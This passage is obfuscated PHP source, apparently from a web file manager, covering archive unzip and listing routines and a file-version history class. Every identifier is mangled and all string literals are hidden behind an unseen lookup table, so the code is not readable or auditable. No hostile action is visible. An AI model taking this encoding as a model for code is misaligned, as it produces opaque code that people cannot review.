$ĞâÂ¶); recursion_dir($ĞâÂ¶, $ëÈ¦¨·ñ, $•‡ÀûŸ‘, 0); $Í‰’¼•é = array_merge($ëÈ¦¨·ñ, $•‡ÀûŸ‘); $Ê‘±Ôöö = array(); foreach ($Í‰’¼•é as $ËŒºËğş) { $¯¨Úöæ§ = IO::move(self::iconvApp($ËŒºËğş), $æˆ¬°óÙ, $•¨†ÏÊî); if ($¯¨Úöæ§) { $Ê‘±Ôöö[] = $¯¨Úöæ§; } } del_dir($ĞâÂ¶); } else { $¯¨Úöæ§ = IO::move($ØÖÖğ¡[$™«–•£[230]], $æˆ¬°óÙ, $•¨†ÏÊî, get_path_this($¾Š¨××Ï[$™«–•£[32]])); if ($¯¨Úöæ§) { $Ê‘±Ôöö[] = $¯¨Úöæ§; } } return $Ê‘±Ôöö ? $Ê‘±Ôöö : !1; } public static function unzipList($€­ê¸Ÿ¯) { $ÓÏ¢âµ“ =& $_SERVER[íïàËŸë]; $˜ù‚à = isset($€­ê¸Ÿ¯[$ÓÏ¢âµ“[1290]]) ? $€­ê¸Ÿ¯[$ÓÏ¢âµ“[1290]] : !1; $“È·º¸’ = isset($€­ê¸Ÿ¯[$ÓÏ¢âµ“[1286]]) ? @json_decode($€­ê¸Ÿ¯[$ÓÏ¢âµ“[1286]], !0) : -1; $ˆ‹Ñ¦ÔË = self::unzipPart($€­ê¸Ÿ¯[$ÓÏ¢âµ“[87]], $“È·º¸’); if (!$ˆ‹Ñ¦ÔË || !IO::exist($ˆ‹Ñ¦ÔË[$ÓÏ¢âµ“[230]])) { show_json(LNG($ÓÏ¢âµ“[108]), !1); } $¿ä÷ÎŒÑ = $ˆ‹Ñ¦ÔË[$ÓÏ¢âµ“[1285]][count($ˆ‹Ñ¦ÔË[$ÓÏ¢âµ“[1285]]) - 1]; $“ÇŒÆĞæ = in_array(IO::ext($ˆ‹Ñ¦ÔË[$ÓÏ¢âµ“[230]]), array($ÓÏ¢âµ“[389], $ÓÏ¢âµ“[1291], $ÓÏ¢âµ“[1292], $ÓÏ¢âµ“[1293], $ÓÏ¢âµ“[1294], $ÓÏ¢âµ“[1295])); if (!$˜ù‚à && ($¿ä÷ÎŒÑ[$ÓÏ¢âµ“[1286]] == -1 || $“ÇŒÆĞæ)) { $”¦à§ = $ˆ‹Ñ¦ÔË[$ÓÏ¢âµ“[1287]] . get_path_this($ˆ‹Ñ¦ÔË[$ÓÏ¢âµ“[230]]) . $ÓÏ¢âµ“[1296]; if (!IO::exist($”¦à§)) { $Æ¡˜¯²… = $¿ä÷ÎŒÑ[$ÓÏ¢âµ“[1286]] == -1 ? get_path_ext(IO::pathThis($€­ê¸Ÿ¯[$ÓÏ¢âµ“[87]])) : get_path_ext($ˆ‹Ñ¦ÔË[$ÓÏ¢âµ“[230]]); $ãéŸ¡¥ò = KodArchive::listContent(self::iconvSystem($ˆ‹Ñ¦ÔË[$ÓÏ¢âµ“[230]]), !0, $Æ¡˜¯²…); self::unzipErrorCheck($ãéŸ¡¥ò, array($ÓÏ¢âµ“[1297], $€­ê¸Ÿ¯, $ˆ‹Ñ¦ÔË)); @file_put_contents($”¦à§, json_encode($ãéŸ¡¥ò[$ÓÏ¢âµ“[1298]])); } return @json_decode(IO::getContent($”¦à§), !0); } IO::fileOut($ˆ‹Ñ¦ÔË[$ÓÏ¢âµ“[230]], $˜ù‚à, get_path_this($¿ä÷ÎŒÑ[$ÓÏ¢âµ“[32]])); die; } private static function zipFileList($šµŸ«€ñ, $ÁÚÖ®† = false) { $¼‡İ‹ÑÙ =& $_SERVER[íïàËŸë]; $¿àîÀÙ‰ = array(); foreach ($šµŸ«€ñ as $Ó®¹½£Ç) { $…üº¶§ = $Ó®¹½£Ç[$¼‡İ‹ÑÙ[87]]; if ($ÁÚÖ®†) { $…üº¶§ = self::copy($Ó®¹½£Ç[$¼‡İ‹ÑÙ[87]], $ÁÚÖ®†, $¼‡İ‹ÑÙ[901]); } else { $¶èê“ÁË = self::init($Ó®¹½£Ç[$¼‡İ‹ÑÙ[87]]); if ($¶èê“ÁË->getType() == $¼‡İ‹ÑÙ[109]) { $…üº¶§ = $¶èê“ÁË->path; } } if ($…üº¶§ && self::local()->exist($…üº¶§)) { $¿àîÀÙ‰[$Ó®¹½£Ç[$¼‡İ‹ÑÙ[87]]] = $…üº¶§; } } if (!empty($¿àîÀÙ‰)) { return array_values($¿àîÀÙ‰); } show_json(LNG($¼‡İ‹ÑÙ[1257]), !1); } private static function localFilePath($äé¢”Ÿ†) { $ñ¨’íì™ =& $_SERVER[íïàËŸë]; $ìÅÙììö = KodIO::parse($äé¢”Ÿ†); if ($ìÅÙììö[$ñ¨’íì™[33]] == KodIO::KOD_SOURCE) { $˜ıîŸú² = Model($ñ¨’íì™[907])->fileInfoGet(KodIO::sourceID($äé¢”Ÿ†)); if (!$˜ıîŸú²[$ñ¨’íì™[87]]) { show_json($ñ¨’íì™[1299], !1); } $äé¢”Ÿ† = $˜ıîŸú²[$ñ¨’íì™[87]]; } $Œ”É×ï“ = self::init($äé¢”Ÿ†); if ($Œ”É×ï“->pathParse[$ñ¨’íì™[1243]]) { $äé¢”Ÿ† = $Œ”É×ï“->pathParse[$ñ¨’íì™[1243]]; $Œ”É×ï“ = self::init($äé¢”Ÿ†); } $èŞÓé‹× = $Œ”É×ï“->getType(); if ($èŞÓé‹× == $ñ¨’íì™[109] || $èŞÓé‹× == $ñ¨’íì™[1300]) { if (!$Œ”É×ï“->exist($Œ”É×ï“->path)) { show_json(LNG($ñ¨’íì™[108]), !1); } return $Œ”É×ï“->path; } return !1; } public static function unzipPart($ó÷ˆ‡øÔ, $§ÌÂØ­ = -1) { $÷šª’ŠÁ =& $_SERVER[íïàËŸë]; $—©ñ’ = IO::pathThis($ó÷ˆ‡øÔ); if (!$§ÌÂØ­ || $§ÌÂØ­ == -1) { $ûñ«¥¾° = array(array($÷šª’ŠÁ[32] => $—©ñ’, $÷šª’ŠÁ[1286] => -1)); $ûñ«¥¾°[0][$÷šª’ŠÁ[1301]] = $ûñ«¥¾°[0][$÷šª’ŠÁ[32]]; } else { if (is_array($§ÌÂØ­)) { $ûñ«¥¾° = $§ÌÂØ­; $’¼œÁ¾ = count($ûñ«¥¾°) - 1; for ($÷ÓÃùº = 0; $÷ÓÃùº <= $’¼œÁ¾; $÷ÓÃùº++) { $€Ô½ï·õ = $ûñ«¥¾°[$÷ÓÃùº]; $ ˜‚Åƒ = get_path_this($€Ô½ï·õ[$÷šª’ŠÁ[32]]) . (checkExtSafe($€Ô½ï·õ[$÷šª’ŠÁ[32]]) ? $÷šª’ŠÁ[12] : $÷šª’ŠÁ[1302]); $ûñ«¥¾°[$÷ÓÃùº][$÷šª’ŠÁ[1301]] = $÷šª’ŠÁ[1303] . intval($€Ô½ï·õ[$÷šª’ŠÁ[1286]]) . $÷šª’ŠÁ[462] . $ ˜‚Åƒ; if ($÷ÓÃùº == 0) { continue; } $ûñ«¥¾°[$÷ÓÃùº][$÷šª’ŠÁ[1301]] = $ûñ«¥¾°[$÷ÓÃùº - 1][$÷šª’ŠÁ[1301]] . $÷šª’ŠÁ[1304] . $ûñ«¥¾°[$÷ÓÃùº][$÷šª’ŠÁ[1301]]; } } } if (!is_array($ûñ«¥¾°) || count($ûñ«¥¾°) == 0) { return !1; } $±¦İÏšõ = $ûñ«¥¾°[count($ûñ«¥¾°) - 1]; if (!IO::exist($ó÷ˆ‡øÔ)) { return !1; } $ğ’›á’ó = TEMP_FILES . $÷šª’ŠÁ[1305] . kodIO::hashPathSafe($ó÷ˆ‡øÔ) . $÷šª’ŠÁ[8]; $Ä‰¾¼ß‡ = $ğ’›á’ó . $±¦İÏšõ[$÷šª’ŠÁ[1301]]; mk_dir($ğ’›á’ó); file_put_contents(TEMP_FILES . $÷šª’ŠÁ[1277], $÷šª’ŠÁ[12]); if (IO::exist($Ä‰¾¼ß‡)) { return array($÷šª’ŠÁ[230] => $Ä‰¾¼ß‡, $÷šª’ŠÁ[1285] => $ûñ«¥¾°, $÷šª’ŠÁ[1287] => $ğ’›á’ó); } $ûûº†Üå = self::localFilePath($ó÷ˆ‡øÔ); if (!$ûûº†Üå) { $ûûº†Üå = $ğ’›á’ó . $÷šª’ŠÁ[1306]; if (!IO::exist($ûûº†Üå)) { self::copy($ó÷ˆ‡øÔ, $ğ’›á’ó, !1, get_path_this($ûûº†Üå)); } } if (!$ûûº†Üå || !IO::exist($ûûº†Üå)) { return !1; } if ($±¦İÏšõ[$÷šª’ŠÁ[1286]] == -1) { return array($÷šª’ŠÁ[230] => $ûûº†Üå, $÷šª’ŠÁ[1285] => $ûñ«¥¾°, $÷šª’ŠÁ[1287] => $ğ’›á’ó); } $çîøÉ ® = $ûûº†Üå; foreach ($ûñ«¥¾° as $÷ÓÃùº => $€Ô½ï·õ) { if (!$€Ô½ï·õ || $€Ô½ï·õ[$÷šª’ŠÁ[1286]] == $÷šª’ŠÁ[1284]) { break; } if (substr($€Ô½ï·õ[$÷šª’ŠÁ[32]], -1, 1) == $÷šª’ŠÁ[8]) { break; } $íù±Ûû« = in_array(get_path_ext($€Ô½ï·õ[$÷šª’ŠÁ[1301]]), array($÷šª’ŠÁ[389], $÷šª’ŠÁ[1291], $÷šª’ŠÁ[1292], $÷šª’ŠÁ[1293], $÷šª’ŠÁ[1294], $÷šª’ŠÁ[1295])); $ˆÆÒĞíö = $÷ÓÃùº == count($ûñ«¥¾°) - 1 && $íù±Ûû«; $ÅÉ ¸ó¾ = $ğ’›á’ó . $€Ô½ï·õ[$÷šª’ŠÁ[1301]]; $«Öıö‹ = $ğ’›á’ó . get_path_this($€Ô½ï·õ[$÷šª’ŠÁ[32]]); if (IO::exist($ÅÉ ¸ó¾)) { $çîøÉ ® = $ÅÉ ¸ó¾; continue; } $Ó‡ŸÁµ = $÷ÓÃùº == 0 ? get_path_ext($—©ñ’) : get_path_ext($çîøÉ ®); $ÂÁ¯®ËÁ = KodArchive::extract(self::iconvSystem($çîøÉ ®), $ğ’›á’ó, $€Ô½ï·õ[$÷šª’ŠÁ[1286]], $“¢è’Á, $Ó‡ŸÁµ); self::unzipErrorCheck($ÂÁ¯®ËÁ, array($÷šª’ŠÁ[1307], $ó÷ˆ‡øÔ, $ûñ«¥¾°, $€Ô½ï·õ, $ÅÉ ¸ó¾)); if (IO::exist($«Öıö‹)) { IO::rename($«Öıö‹, get_path_this($ÅÉ ¸ó¾)); } $çîøÉ ® = $ÅÉ ¸ó¾; } $Ä‰¾¼ß‡ = $çîøÉ ®; return array($÷šª’ŠÁ[230] => $çîøÉ ®, $÷šª’ŠÁ[1285] => $ûñ«¥¾°, $÷šª’ŠÁ[1287] => $ğ’›á’ó); } private static function unzipErrorCheck($˜ï‘û†í, $‡ŸØÂ³ı = false) { $ÑâÄÇ˜Ò =& $_SERVER[íïàËŸë]; if ($˜ï‘û†í[$ÑâÄÇ˜Ò[1308]]) { return !0; } write_log(array($ÑâÄÇ˜Ò[1309], $˜ï‘û†í, $‡ŸØÂ³ı), $ÑâÄÇ˜Ò[1310]); show_json($ÑâÄÇ˜Ò[1311] . json_encode($˜ï‘û†í[$ÑâÄÇ˜Ò[1298]]), !1); die; } } class IOHistory { public static $_historyBase = ''; function __construct() { } public static function bindEvent() { $Õ»ì–Í =& $_SERVER[íïàËŸë]; $æéÏ‡Ÿ‹ = $GLOBALS[$Õ»ì–Í[6]][$Õ»ì–Í[92]]; if ($æéÏ‡Ÿ‹[$Õ»ì–Í[1312]] != 1) { return; } if ($æéÏ‡Ÿ‹[$Õ»ì–Í[1313]] <= 0) { return; } if (isset($_REQUEST[$Õ»ì–Í[1314]]) && $_REQUEST[$Õ»ì–Í[1314]] == $Õ»ì–Í[91]) { return; } Hook::bind($Õ»ì–Í[1315], $Õ»ì–Í[1316]); Hook::bind($Õ»ì–Í[1317], $Õ»ì–Í[1318]); Hook::bind($Õ»ì–Í[1319], $Õ»ì–Í[1320]); Hook::bind($Õ»ì–Í[1321], $Õ»ì–Í[1322]); Hook::bind($Õ»ì–Í[1323], $Õ»ì–Í[1324]); Hook::bind($Õ»ì–Í[1325], $Õ»ì–Í[1326]); } public static function eventBeforeUpload($ÏÕå‘ƒÅ) { if ($ÏÕå‘ƒÅ[3] && $ÏÕå‘ƒÅ[3] != REPEAT_REPLACE) { return; } $İË¿Ö § = self::parsePath($ÏÕå‘ƒÅ[0]); if (!$İË¿Ö §) { return; } self::add($İË¿Ö §); } public static function eventBeforeEdit($éº¾Ø„²) { $ŠÕóŠÄ = self::parsePath($éº¾Ø„²[0]); if (!$ŠÕóŠÄ) { return; } self::add($ŠÕóŠÄ); } public static function eventBeforeCopyFile($»øÊ¹¸Ş, $Á—„òöí, $òºçŠÔœ, $ıü·Íï, $£ò”­ãˆ, $¾‹–Ó­) { $ˆí–ÑâĞ =& $_SERVER[íïàËŸë]; if (isset($òºçŠÔœ->_data[$ˆí–ÑâĞ[1247]]) && $òºçŠÔœ->_data[$ˆí–ÑâĞ[1247]]) { return; } $ìØàˆÀ = $òºçŠÔœ->getPathOuter($ıü·Íï); $ŸâÅñôä = self::parsePath($ìØàˆÀ); if (!$ŸâÅñôä) { return; } self::add($ŸâÅñôä); } public static function eventBeforeRename($›·÷ñ—›) { $‡ˆƒ§ÕÕ =& $_SERVER[íïàËŸë]; $º‰ñ˜ = self::parsePath($›·÷ñ—›[0]); if (!$º‰ñ˜) { return; } $Ú„ŞÑ“° = self::checkInHistory($º‰ñ˜); if (!$Ú„ŞÑ“°) { return; } if ($Ú„ŞÑ“°[$‡ˆƒ§ÕÕ[33]] == $‡ˆƒ§ÕÕ[230]) { $§œÍÏ›  = self::listData($º‰ñ˜); if ($§œÍÏ›  && $§œÍÏ› [$‡ˆƒ§ÕÕ[445]]) { self::moveHistory($º‰ñ˜, $›·÷ñ—›[1]); } } else { IO::rename($Ú„ŞÑ“°[$‡ˆƒ§ÕÕ[87]], $›·÷ñ—›[1]); } } public static function eventBeforeMove($¤‘˜Í€¯) { $î£åÏú¿ =& $_SERVER[íïàËŸë]; $Ÿ™Ãò = self::parsePath($¤‘˜Í€¯[0]); if (!$Ÿ™Ãò) { return; } $¤ïòÇÕ = self::parsePath($¤‘˜Í€¯[1]); if (!$¤ïòÇÕ) { return; } $ËĞìñÖ› = $¤‘˜Í€¯[3]; $‰¥Ã÷ø‘ = self::checkInHistory($Ÿ™Ãò); if (!$‰¥Ã÷ø‘) { return; } $ßÍô»Üã = self::pathHistory($¤ïòÇÕ); if ($‰¥Ã÷ø‘[$î£åÏú¿[33]] == $î£åÏú¿[230]) { $ˆÍØ‰ñÈ = self::listData($Ÿ™Ãò); $ª öÇ© = rtrim($¤ïòÇÕ, $î£åÏú¿[8]) . $î£åÏú¿[8] . ($ËĞìñÖ› ? $ËĞìñÖ› : get_path_this($Ÿ™Ãò)); $«¥±©® = self::listData($ª öÇ©); if ($ˆÍØ‰ñÈ && $ˆÍØ‰ñÈ[$î£åÏú¿[445]] && $«¥±©® && $«¥±©®[$î£åÏú¿[445]]) { return self::clear($Ÿ™Ãò); } if ($ˆÍØ‰ñÈ && $ˆÍØ‰ñÈ[$î£åÏú¿[445]]) { self::moveHistory($Ÿ™Ãò, $ËĞìñÖ›, $ßÍô»Üã); } } else { IO::move($‰¥Ã÷ø‘[$î£åÏú¿[87]], $ßÍô»Üã, !1, $ËĞìñÖ›); self::clearEmptyFolder(IO::pathFather($‰¥Ã÷ø‘[$î£åÏú¿[87]])); } } public static function eventAfterRemove($×ÛÀÙÃ©, $½ÂäØ©ò) { $öø‰»µ =& $_SERVER[íïàËŸë]; if (!$½ÂäØ©ò) { return; } $¿—œ—„¬ = self::parsePath($×ÛÀÙÃ©[0]); if (!$¿—œ—„¬) { return; } $ØÁø·½ = self::checkInHistory($¿—œ—„¬); if (!$ØÁø·½) { return; } if ($ØÁø·½[$öø‰»µ[33]] == $öø‰»µ[230]) { $ğ¿Ëïè« = self::listData($¿—œ—„¬, !1); if ($ğ¿Ëïè« && $ğ¿Ëïè«[$öø‰»µ[445]]) { self::clear($¿—œ—„¬, !1); } } else { IO::remove($ØÁø·½[$öø‰»µ[87]]); self::clearEmptyFolder(IO::pathFather($ØÁø·½[$öø‰»µ[87]])); } } private static function checkInHistory($–´˜Æ°í) { $Âöİå¶ = self::pathHistory($–´˜Æ°í); if (!IO::exist($Âöİå¶)) { $Âöİå¶ .= $_SERVER[íïàËŸë][1327]; } return IO::exist($Âöİå¶) ? IO::info($Âöİå¶) : !1; } private static function parsePath($¶æÈË²ä) { $¿şŞğ›‘ =& $_SERVER[íïàËŸë]; if (!$¶æÈË²ä) { return !1; } if (isset($GLOBALS[$¿şŞğ›‘[1328]]) && $GLOBALS[$¿şŞğ›‘[1328]]) { return; } $·‚£›ÕŸ = KodIO::parse($¶æÈË²ä); $µ÷áù¤ = $·‚£›ÕŸ[$¿şŞğ›‘[33]]; $İû¬·ôŞ = !$µ÷áù¤ || $µ÷áù¤ == KodIO::KOD_IO || $µ÷áù¤ == KodIO::KOD_SHARE_ITEM; if (!$İû¬·ôŞ || !$·‚£›ÕŸ[$¿şŞğ›‘[1329]]) { return !1; } if (substr($¶æÈË²ä, 0, strlen(DATA_PATH . $¿şŞğ›‘[1330])) == DATA_PATH . $¿şŞğ›‘[1330]) { return !1; } if ($µ÷áù¤ == KodIO::KOD_SHARE_ITEM) { $¯»¡Ü³ö = IO::init($¶æÈË²ä); if ($¯»¡Ü³ö->pathParse[$¿şŞğ›‘[1243]]) { return self::parsePath($¯»¡Ü³ö->pathParse[$¿şŞğ›‘[1243]]); } return !1; } if (!self::$_historyBase) { self::$_historyBase = self::getBasePath(); } $£¨Ùé‹½ = array(self::$_historyBase, TEMP_PATH, BASIC_PATH . $¿şŞğ›‘[1331]); foreach ($£¨Ùé‹½ as $«Õ¦øà) { if (!$µ÷áù¤ && substr($¶æÈË²ä, 0, strlen($«Õ¦øà)) == $«Õ¦øà) { return !1; } } self::log($GLOBALS[$¿şŞğ›‘[1238]] . $¿şŞğ›‘[1332] . $¶æÈË²ä); return $¶æÈË²ä; } private static function pathHistory($ÂÏ·îé÷) { $İÊÑ’¯ =& $_SERVER[íïàËŸë]; $ çƒÈÍ° = self::$_historyBase . ltrim(KodIO::clear($ÂÏ·îé÷), $İÊÑ’¯[8]); $ çƒÈÍ° = str_replace(array($İÊÑ’¯[1333]), array($İÊÑ’¯[1334]), $ çƒÈÍ°); return $ çƒÈÍ°; } public static function log($Äœ·ÉÜ) { } public static function historyCount($°•ü‰¢Ù) { $ì¶¸Ç˜™ =& $_SERVER[íïàËŸë]; $Ä¨ÌŞóÚ = array(); $ÄåÍ›‘ = array(); foreach ($°•ü‰¢Ù as $Ÿ¾ˆÖÎ’) { $Ã Ãî“Ì = get_path_father($Ÿ¾ˆÖÎ’); if (!$ÄåÍ›‘[$Ã Ãî“Ì]) { $ÄåÍ›‘[$Ã Ãî“Ì] = array(); } $ÄåÍ›‘[$Ã Ãî“Ì][] = get_path_this($Ÿ¾ˆÖÎ’); } foreach ($ÄåÍ›‘ as $Ã Ãî“Ì => $ÒÄèŒ€ó) { $ûêÓæÌŸ = self::parsePath($Ã Ãî“Ì); if (!$ûêÓæÌŸ) { continue; } foreach ($ÒÄèŒ€ó as $†¹Ç­”) { $ì¢ß£êË = self::listData(rtrim($ûêÓæÌŸ, $ì¶¸Ç˜™[8]) . $ì¶¸Ç˜™[8] . $†¹Ç­”, !1); if ($ì¢ß£êË && $ì¢ß£êË[$ì¶¸Ç˜™[445]]) { $Ä¨ÌŞóÚ[rtrim($Ã Ãî“Ì, $ì¶¸Ç˜™[8]) . $ì¶¸Ç˜™[8] . $†¹Ç­”] = count($ì¢ß£êË[$ì¶¸Ç˜™[445]]); } } } return $Ä¨ÌŞóÚ; } public static function add($Ÿ÷’¼Ìå) { $”‹Ëü·â =& $_SERVER[íïàËŸë]; $Ÿ®±æºª = self::listData($Ÿ÷’¼Ìå); if (!$Ÿ®±æºª) { return; } $óä‹• = Model($”‹Ëü·â[853])->get($”‹Ëü·â[1335]); $ÎÛØÚıÛ = intval($GLOBALS[$”‹Ëü·â[6]][$”‹Ëü·â[92]][$”‹Ëü·â[1313]]); $§óÓ» é = $óä‹• == $”‹Ëü·â[1336] ? min(5, $ÎÛØÚıÛ) : $ÎÛØÚıÛ; if ($ÎÛØÚıÛ <= 0) { return; } $·´ñÏç„ = IO::info($Ÿ÷’¼Ìå); $¶’ÀšÁ¦ = $Ÿ®±æºª[$”‹Ëü·â[445]]; if ($·´ñÏç„[$”‹Ëü·â[79]] == 0) { return; } if ($·´ñÏç„[$”‹Ëü·â[79]] >= 1024 * 1024 * 500) { return !1; } $ĞÉôíÁƒ = IO::hashSimple($Ÿ÷’¼Ìå); if ($¶’ÀšÁ¦ && $¶’ÀšÁ¦[0][$”‹Ëü·â[672]] == $ĞÉôíÁƒ) { return !0; } if (array_key_exists($”‹Ëü·â[233], $·´ñÏç„) && !$·´ñÏç„[$”‹Ëü·â[233]]) { return !1; } $ƒøÒó = short_id(time()); $Î’×Êå = array($”‹Ëü·â[475] => $ƒøÒó, $”‹Ëü·â[672] => $ĞÉôíÁƒ, $”‹Ëü·â[32] => $·´ñÏç„[$”‹Ëü·â[32]] . $”‹Ëü·â[10] . date($”‹Ëü·â[1337]) . rand_string(1), $”‹Ëü·â[79] => $·´ñÏç„[$”‹Ëü·â[79]], $”‹Ëü·â[527] => USER_ID, $”‹Ëü·â[231] => time(), $”‹Ëü·â[1338] => $”‹Ëü·â[12]); IO::mkdir($Ÿ®±æºª[$”‹Ëü·â[1339]]); $ùô€ñ×‡ = IO::copy($Ÿ÷’¼Ìå, $Ÿ®±æºª[$”‹Ëü·â[1339]], !1, $Î’×Êå[$”‹Ëü·â[32]]); if (!$ùô€ñ×‡) { self::clearEmptyFolder($Ÿ®±æºª[$”‹Ëü·â[1339]]); return !1; } array_unshift($¶’ÀšÁ¦, $Î’×Êå); if (count($¶’ÀšÁ¦) > $§óÓ» é) { $Êô­ğŸ = array_slice($¶’ÀšÁ¦, $§óÓ» é); foreach ($Êô­ğŸ as $ÕÎ­ÕÀî) { IO::remove($Ÿ®±æºª[$”‹Ëü·â[1339]] . $ÕÎ­ÕÀî[$”‹Ëü·â[32]]); } $¶’ÀšÁ¦ = array_slice($¶’ÀšÁ¦, 0, $§óÓ» é); } return self::saveData($Ÿ®±æºª[$”‹Ëü·â[1340]], $¶’ÀšÁ¦); } public static function remove($·¥©µƒ , $¿Û‘ú—œ) { $°¦Ãıèµ =& $_SERVER[íïàËŸë]; $ÖûšÓ»É = self::listData($·¥©µƒ ); $Óì˜©ÀÏ = array(); if (!$ÖûšÓ»É) { return !1; } foreach ($ÖûšÓ»É[$°¦Ãıèµ[445]] as $Áé«„Ÿ) { if ($Áé«„Ÿ[$°¦Ãıèµ[475]] == $¿Û‘ú—œ) { IO::remove($ÖûšÓ»É[$°¦Ãıèµ[1339]] . $Áé«„Ÿ[$°¦Ãıèµ[32]]); continue; } $Óì˜©ÀÏ[] = $Áé«„Ÿ; } return self::saveData($ÖûšÓ»É[$°¦Ãıèµ[1340]], $Óì˜©ÀÏ); } public static function clear($…áÖ›–ú, $³Û€¹şä = true) { $´€äøÂ =& $_SERVER[íïàËŸë]; $Ø«ºæşÁ = self::listData($…áÖ›–ú, $³Û€¹şä); if (!$Ø«ºæşÁ) { return !1; } foreach ($Ø«ºæşÁ[$´€äøÂ[445]] as $ÃÏÃ´Ì´) { IO::remove($Ø«ºæşÁ[$´€äøÂ[1339]] . $ÃÏÃ´Ì´[$´€äøÂ[32]]); } return self::saveData($Ø«ºæşÁ[$´€äøÂ[1340]], array()); } public static function moveHistory($¶ÅÙ¶Øş, $«ï¾¡±® = '', $ú¢‘¤Ìó = '') { $úæ”­êÄ =& $_SERVER[íïàËŸë]; $š¯ãÂ™Ç = self::listData($¶ÅÙ¶Øş, !1); if (!$š¯ãÂ™Ç || !$š¯ãÂ™Ç[$úæ”­êÄ[445]]) { return !1; } $˜…õú»® = $úæ”­êÄ[1327]; $«ï¾¡±® = $«ï¾¡±® ? $«ï¾¡±® : get_path_this($¶ÅÙ¶Øş); $ú¢‘¤Ìó = $ú¢‘¤Ìó ? $ú¢‘¤Ìó : $š¯ãÂ™Ç[$úæ”­êÄ[1339]]; $´˜‡ñ¶­ = substr(get_path_this($š¯ãÂ™Ç[$úæ”­êÄ[1340]]), 0, -strlen($˜…õú»®)); foreach ($š¯ãÂ™Ç[$úæ”­êÄ[445]] as $™à¢Øáú => $î×Óİã¾) { $•ô»äÔş = $«ï¾¡±® . substr($î×Óİã¾[$úæ”­êÄ[32]], strlen($´˜‡ñ¶­)); $€»™½Õê = IO::move($š¯ãÂ™Ç[$úæ”­êÄ[1339]] . $î×Óİã¾[$úæ”­êÄ[32]], $ú¢‘¤Ìó, !1, $•ô»äÔş); if ($€»™½Õê) { $š¯ãÂ™Ç[$úæ”­êÄ[445]][$™à¢Øáú][$úæ”­êÄ[32]] = $•ô»äÔş; } } $š¯ãÂ™Ç[$úæ”­êÄ[1340]] = IO::move($š¯ãÂ™Ç[$úæ”­êÄ[1340]], $ú¢‘¤Ìó, !1, $«ï¾¡±® . $˜…õú»®); self::saveData($š¯ãÂ™Ç[$úæ”­êÄ[1340]], $š¯ãÂ™Ç[$úæ”­êÄ[445]]); self::clearEmptyFolder($š¯ãÂ™Ç[$úæ”­êÄ[1339]]); } public static function rollback($•¤‰É, $‚åé¬Ó) { $õ¹ØÏ¥š =& $_SERVER[íïàËŸë]; $üÎÉŞÊé = self::listData($•¤‰É); if (!$üÎÉŞÊé) { return; } $ğÛÊè¤ú = IO::info($•¤‰É); foreach ($üÎÉŞÊé[$õ¹ØÏ¥š[445]] as $ù´Ô ï => $¾ï¢Ó”ò) { if ($¾ï¢Ó”ò[$õ¹ØÏ¥š[475]] == $‚åé¬Ó) { self::add($•¤‰É); $˜ÇñÅ°Ù = $üÎÉŞÊé[$õ¹ØÏ¥š[1339]] . $¾ï¢Ó”ò[$õ¹ØÏ¥š[32]]; $±½‰ç = IO::copy($˜ÇñÅ°Ù, IO::pathFather($•¤‰É), REPEAT_REPLACE, $ğÛÊè¤ú[$õ¹ØÏ¥š[32]]); if ($±½‰ç) { self::remove($•¤‰É, $‚åé¬Ó); } return $±½‰ç; } } return !1; } public static function setDetail($ÉõÅÏ·’, $­å’Úå, $ÙÏ³¶Ê–) { $üÀÄØ›Ã =& $_SERVER[íïàËŸë]; $ÚÊä«ï = self::listData($ÉõÅÏ·’); if (!$ÚÊä«ï) { return; } foreach ($ÚÊä«ï[$üÀÄØ›Ã[445]] as $Ã±Ç³ÜÊ => $ÉµÙÑà) { if ($ÉµÙÑà[$üÀÄØ›Ã[475]] == $­å’Úå) { $ÚÊä«ï[$üÀÄØ›Ã[445]][$Ã±Ç³ÜÊ][$üÀÄØ›Ã[1338]] = $ÙÏ³¶Ê–; self::saveData($ÚÊä«ï[$üÀÄØ›Ã[1340]], $ÚÊä«ï[$üÀÄØ›Ã[445]]); return !0; } } return !1; } public static function fileInfo($Ûƒ éÔ, $ÎÖš–Ëü) { $ò¥Üí =& $_SERVER[íïàËŸë]; $ô¾†„¥® = self::listData($Ûƒ éÔ); if (!$ô¾†„¥®) { show_json(LNG($ò¥Üí[108]), !1); } $‘Ãã”œÌ = $ò¥Üí[12]; foreach ($ô¾†„¥®[$ò¥Üí[445]] as $êÕøßÎâ => $£ü‘Çà·) { if ($£ü‘Çà·[$ò¥Üí[475]] != $ÎÖš–Ëü) { continue; } $‘Ãã”œÌ = $ô¾†„¥®[$ò¥Üí[1339]] . $£ü‘Çà·[$ò¥Üí[32]]; break; } if (!$‘Ãã”œÌ) { show_json(LNG($ò¥Üí[108]), !1); } return IO::info($‘Ãã”œÌ); } public static function fileOut($¼ˆÕ‰€, $Ø×Èº¹Ü, $ô¸ö÷ÈØ = false) { $Èê™‡àß =& $_SERVER[íïàËŸë]; $âÃò‡Å± = self::fileInfo($¼ˆÕ‰€, $Ø×Èº¹Ü); $Ù§­×Ø  =& $GLOBALS[$Èê™‡àß[7]]; $ô¸ö÷ÈØ = isset($Ù§­×Ø [$Èê™‡àß[1290]]) && $Ù§­×Ø [$Èê™‡àß[1290]] == 1; if (isset($Ù§­×Ø [$Èê™‡àß[33]]) && $Ù§­×Ø [$Èê™‡àß[33]] == $Èê™‡àß[1341]) { return IO::fileOutImage($âÃò‡Å±[$Èê™‡àß[87]], $Ù§­×Ø [$Èê™‡àß[1342]]); } IO::fileOut($âÃò‡Å±[$Èê™‡àß[87]], $ô¸ö÷ÈØ, get_path_this($¼ˆÕ‰€)); } public static function listData($Êî¬·Ñ, $šÂ£å†Ç = true) { $ÈÔİ¼°ç =& $_SERVER[íïàËŸë]; if ($šÂ£å†Ç && !IO::exist($Êî¬·Ñ)) { return !1; } if (!self::$_historyBase) { self::$_historyBase = self::getBasePath(); } if (substr($Êî¬·Ñ, 0, strlen(TEMP_PATH)) == TEMP_PATH) { return !1; } $„÷˜ôõŒ = self::pathHistory($Êî¬·Ñ); $Ä€ä‰ÕÛ = array($ÈÔİ¼°ç[1340] => $„÷˜ôõŒ . $ÈÔİ¼°ç[1327], $ÈÔİ¼°ç[1339] => rtrim(get_path_father($„÷˜ôõŒ), $ÈÔİ¼°ç[8]) . $ÈÔİ¼°ç[8], $ÈÔİ¼°ç[445] => array()); $·øÈô“ = IO::getContent($Ä€ä‰ÕÛ[$ÈÔİ¼°ç[1340]]); if ($·øÈô“) { $¡÷»¨ãÓ = json_decode($·øÈô“, !0); if (is_array($¡÷»¨ãÓ)) { $Ä€ä‰ÕÛ[$ÈÔİ¼°ç[445]] = $¡÷»¨ãÓ; } } return $Ä€ä‰ÕÛ; } 